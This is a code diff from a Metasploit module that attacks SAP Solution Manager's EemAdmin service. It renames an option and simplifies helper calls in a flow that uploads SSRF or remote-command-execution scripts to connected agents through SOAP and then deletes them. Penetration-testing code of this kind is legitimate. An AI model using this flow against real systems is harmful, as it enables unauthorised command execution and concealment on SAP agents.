@@ -50,7 +50,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(50000),
-        OptString.new('URIPATH', [true, 'Path to the SAP Solution Manager EemAdmin page from the web root', '/EemAdminService/EemAdmin']),
+        OptString.new('TARGETURI', [true, 'Path to the SAP Solution Manager EemAdmin page from the web root', '/EemAdminService/EemAdmin']),
         OptString.new('SSRF_METHOD', [false, 'HTTP method for SSRF', 'GET']),
         OptString.new('SSRF_URI', [false, 'URI for SSRF', 'http://127.0.0.1:80/']),
         OptString.new('COMMAND', [false, 'Command for execute in agent', 'id']),
@@ -71,7 +71,7 @@ class MetasploitModule < Msf::Auxiliary
   def setup_xml_and_variables
     @host = datastore['RHOSTS']
     @port = datastore['RPORT']
-    @path = datastore['URIPATH']
+    @path = datastore['TARGETURI']
 
     @agent_name = datastore['AGENT']
     @script_name = Rex::Text.rand_text_alphanumeric(12)
@@ -167,7 +167,7 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       print_status("Getting a list of agents connected to the Solution Manager: #{@host}")
-      self.class.agents = make_agents_array(@path)
+      self.class.agents = make_agents_array
     rescue RuntimeError => e
       print_error("Failed to make the list of connected agents on the SAP Solution Manager page at #{@solman_uri}")
       vprint_error("Error #{e.class}: #{e}")
@@ -188,16 +188,16 @@ class MetasploitModule < Msf::Auxiliary
     end
     begin
       vprint_status("Enable EEM on agent: #{@agent_name}")
-      enable_eem(@agent_name, @path)
+      enable_eem(@agent_name)
 
       vprint_status("Start script: #{@script_name} with SSRF payload on agent: #{@agent_name}")
-      send_soap_request(make_soap_body(@agent_name, @script_name, @ssrf_payload), @path)
+      send_soap_request(make_soap_body(@agent_name, @script_name, @ssrf_payload))
 
       vprint_status("Stop script: #{@script_name} on agent: #{@agent_name}")
-      stop_script_in_agent(@agent_name, @script_name, @path)
+      stop_script_in_agent(@agent_name, @script_name)
 
       vprint_status("Delete script: #{@script_name} on agent: #{@agent_name}")
-      delete_script_in_agent(@agent_name, @script_name, @path)
+      delete_script_in_agent(@agent_name, @script_name)
     rescue RuntimeError => e
       print_error("Failed to send SSRF: '#{@ssrf_method} #{@ssrf_uri} HTTP/1.1' from agent: #{@agent_name}")
       vprint_error("Error #{e.class}: #{e}")
@@ -214,16 +214,16 @@ class MetasploitModule < Msf::Auxiliary
     end
     begin
       vprint_status("Enable EEM on agent: #{@agent_name}")
-      enable_eem(@agent_name, @path)
+      enable_eem(@agent_name)
 
       vprint_status("Start script: #{@script_name} with RCE payload on agent: #{@agent_name}")
-      send_soap_request(make_soap_body(@agent_name, @script_name, @rce_payload), @path)
+      send_soap_request(make_soap_body(@agent_name, @script_name, @rce_payload))
 
       vprint_status("Stop script: #{@script_name} on agent: #{@agent_name}")
-      stop_script_in_agent(@agent_name, @script_name, @path)
+      stop_script_in_agent(@agent_name, @script_name)
 
       vprint_status("Delete script: #{@script_name} on agent: #{@agent_name}")
-      delete_script_in_agent(@agent_name, @script_name, @path)
+      delete_script_in_agent(@agent_name, @script_name)
     rescue RuntimeError => e
       print_error("Failed to execution command: '#{@rce_command}' on agent: #{@agent_name}")
       vprint_error("Error #{e.class}: #{e}")
